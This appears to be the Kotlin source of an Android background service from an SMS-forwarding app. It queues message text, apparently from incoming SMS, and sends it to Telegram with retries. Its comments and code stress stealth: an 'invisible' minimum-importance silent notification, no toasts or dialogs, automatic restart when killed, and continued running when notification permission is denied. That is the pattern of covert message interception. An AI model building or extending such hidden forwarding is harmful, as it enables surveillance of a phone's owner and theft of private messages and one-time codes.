package com.ozyab.smsforwarder.service

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.ozyab.smsforwarder.R
import com.ozyab.smsforwarder.telegram.TelegramClient
import com.ozyab.smsforwarder.util.Prefs
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.concurrent.ConcurrentLinkedQueue
import kotlin.math.min

/**
 * Фоновый сервис пересылки.
 *
 * - Foreground service с НЕВИДИМЫМ уведомлением (IMPORTANCE_MIN).
 * - START_STICKY: перезапускается системой при убийстве.
 * - Очередь событий с ретраями (экспоненциальный backoff, кап 5 мин).
 * - Не показывает никаких тостов/диалогов.
 */
class ForwardService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val queue = ConcurrentLinkedQueue<String>()

    @Volatile
    private var workerStarted = false

    private var retryDelayMs = 5_000L

    companion object {
        private const val CHANNEL_ID = "forward_service"
        private const val NOTIFICATION_ID = 1
        const val ACTION_START = "com.ozyab.smsforwarder.START"
        const val ACTION_STOP = "com.ozyab.smsforwarder.STOP"
        const val EXTRA_TEXT = "extra_text"

        fun start(context: Context) {
            val i = Intent(context, ForwardService::class.java).setAction(ACTION_START)
            context.startForegroundService(i)
        }

        /** Старт сервиса и постановка события в очередь (из ресиверов). */
        fun start(context: Context, text: String) {
            val i = Intent(context, ForwardService::class.java)
                .setAction(ACTION_START)
                .putExtra(EXTRA_TEXT, text)
            context.startForegroundService(i)
        }

        fun stop(context: Context) {
            val i = Intent(context, ForwardService::class.java).setAction(ACTION_STOP)
            context.startService(i)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                stopSelf()
                return START_NOT_STICKY
            }
        }

        startAsForeground()

        intent?.getStringExtra(EXTRA_TEXT)?.let { enqueue(it) }

        // Постоянный цикл обработки очереди — только один раз за жизнь сервиса
        if (!workerStarted) {
            workerStarted = true
            scope.launch {
                while (true) {
                    val text = queue.poll()
                    if (text == null) {
                        delay(2_000)
                        continue
                    }
                    val result = TelegramClient.sendMessage(text)
                    when (result) {
                        is TelegramClient.Result.Ok -> {
                            Prefs.sentCount = Prefs.sentCount + 1
                            retryDelayMs = 5_000L
                        }
                        is TelegramClient.Result.Err -> {
                            // Ошибка (нет сети / API недоступен) — вернуть в очередь и подождать
                            queue.add(text)
                            delay(retryDelayMs)
                            retryDelayMs = min(retryDelayMs * 2, 300_000L) // кап 5 мин
                        }
                    }
                }
            }
        }
        return START_STICKY
    }

    /** Добавить событие в очередь (вызывается из ресиверов). */
    fun enqueue(text: String) {
        queue.add(text)
    }

    private fun startAsForeground() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.notification_channel_name),
                // IMPORTANCE_MIN — невидимое уведомление (без звука/вибрации/иконки в шторке)
                NotificationManager.IMPORTANCE_MIN,
            ).apply {
                description = getString(R.string.notification_channel_desc)
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            nm.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.notification_title))
            .setContentText(getString(R.string.notification_text))
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        // Android 13+ (POST_NOTIFICATIONS): если разрешение не выдано —
        // уведомление скрыто автоматически, сервис продолжает работать.
    }

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
    }
}